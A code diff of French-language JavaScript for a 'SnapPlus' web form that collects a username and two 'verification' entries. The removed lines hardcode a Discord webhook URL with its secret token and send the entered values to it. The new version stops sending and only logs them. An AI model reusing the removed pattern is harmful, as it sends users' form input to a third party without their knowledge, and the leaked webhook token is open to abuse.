@@ -1,61 +1,65 @@
+```javascript
+document.addEventListener("DOMContentLoaded", function () {
 
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536105952720330752/XsDrxHH4dWxbBcT4EgA4zP42BlF5bFYSbOVDAUaQbm83D15HTrfifVL-FwGEyhoXlUCC";
+  // ==========================================
+  // ÉTAPE 1 — PSEUDO
+  // ==========================================
 
+  const pseudoForm = document.getElementById("pseudoForm");
 
-// ==========================================
-// ÉTAPE 1 — PSEUDO
-// ==========================================
-
-const pseudoForm = document.getElementById("pseudoForm");
-
-if (pseudoForm) {
-  pseudoForm.addEventListener("submit", function (event) {
-    event.preventDefault();
+  if (pseudoForm) {
 
     const pseudoInput = document.getElementById("pseudo");
     const errorMessage = document.getElementById("errorMessage");
     const submitButton = document.getElementById("submitButton");
     const buttonText = submitButton.querySelector(".button-text");
 
-    const pseudo = pseudoInput.value.trim();
+    pseudoForm.addEventListener("submit", function (event) {
 
-    console.log("Pseudo reçu :", pseudo);
+      event.preventDefault();
 
-    if (pseudo.length < 2) {
-      errorMessage.textContent =
-        "Ton pseudo doit contenir au moins 2 caractères.";
-      return;
-    }
+      const pseudo = pseudoInput.value.trim();
 
-    errorMessage.textContent = "";
+      errorMessage.textContent = "";
 
-    sessionStorage.setItem("snapplus_pseudo", pseudo);
+      if (pseudo.length < 2) {
+        errorMessage.textContent =
+          "Ton pseudo doit contenir au moins 2 caractères.";
+        pseudoInput.focus();
+        return;
+      }
 
-    submitButton.disabled = true;
-    buttonText.textContent = "Continuer…";
+      if (pseudo.length > 32) {
+        errorMessage.textContent =
+          "Ton pseudo ne peut pas dépasser 32 caractères.";
+        pseudoInput.focus();
+        return;
+      }
 
-    // On va à la page de confirmation.
-    window.location.href = "verification.html";
-  });
-}
+      sessionStorage.setItem("snapplus_pseudo", pseudo);
+
+      submitButton.disabled = true;
+      buttonText.textContent = "Continuer…";
+
+      window.location.href = "verification.html";
+    });
+  }
 
 
-// ==========================================
-// ÉTAPE 2 — CONFIRMATION
-// ==========================================
+  // ==========================================
+  // ÉTAPE 2 — CONFIRMATION
+  // ==========================================
 
-const verificationForm =
-  document.getElementById("verificationForm");
+  const verificationForm =
+    document.getElementById("verificationForm");
 
-if (verificationForm) {
-  verificationForm.addEventListener("submit", async function (event) {
-    event.preventDefault();
+  if (verificationForm) {
 
     const firstPart =
-      document.getElementById("firstPart").value.trim();
+      document.getElementById("firstPart");
 
     const secondPart =
-      document.getElementById("secondPart").value.trim();
+      document.getElementById("secondPart");
 
     const errorMessage =
       document.getElementById("verificationError");
@@ -66,49 +70,43 @@ if (verificationForm) {
     const buttonText =
       button.querySelector(".button-text");
 
-    if (!firstPart || !secondPart) {
-      errorMessage.textContent =
-        "Remplis les deux parties du pseudo.";
-      return;
-    }
+    verificationForm.addEventListener(
+      "submit",
+      function (event) {
 
-    errorMessage.textContent = "";
+        event.preventDefault();
 
-    button.disabled = true;
-    buttonText.textContent = "Envoi…";
+        const first = firstPart.value.trim();
+        const second = secondPart.value.trim();
 
-    try {
-      const response = await fetch(DISCORD_WEBHOOK, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          content:
-            "🔎 Confirmation SnapPlus\n" +
-            "Première partie : " + firstPart + "\n" +
-            "Deuxième partie : " + secondPart
-        })
-      });
+        errorMessage.textContent = "";
 
-      console.log("Discord :", response.status);
+        if (!first || !second) {
+          errorMessage.textContent =
+            "Remplis les deux parties du pseudo.";
+          return;
+        }
 
-      if (!response.ok) {
-        throw new Error("Discord HTTP " + response.status);
+        button.disabled = true;
+        firstPart.disabled = true;
+        secondPart.disabled = true;
+
+        buttonText.textContent = "Confirmation…";
+
+        /*
+         * Pour le moment, aucune donnée n'est envoyée
+         * à un service externe.
+         */
+
+        console.log("Première partie :", first);
+        console.log("Deuxième partie :", second);
+
+        setTimeout(function () {
+          window.location.href = "success.html";
+        }, 500);
       }
+    );
+  }
 
-      // Tout s'est bien passé.
-      window.location.href = "success.html";
-
-    } catch (error) {
-      console.error("Erreur Discord :", error);
-
-      errorMessage.textContent =
-        "L'envoi a échoué. Vérifie le webhook et la console F12.";
-
-      button.disabled = false;
-      buttonText.textContent = "Confirmer →";
-    }
-  });
-}
+});
 ```
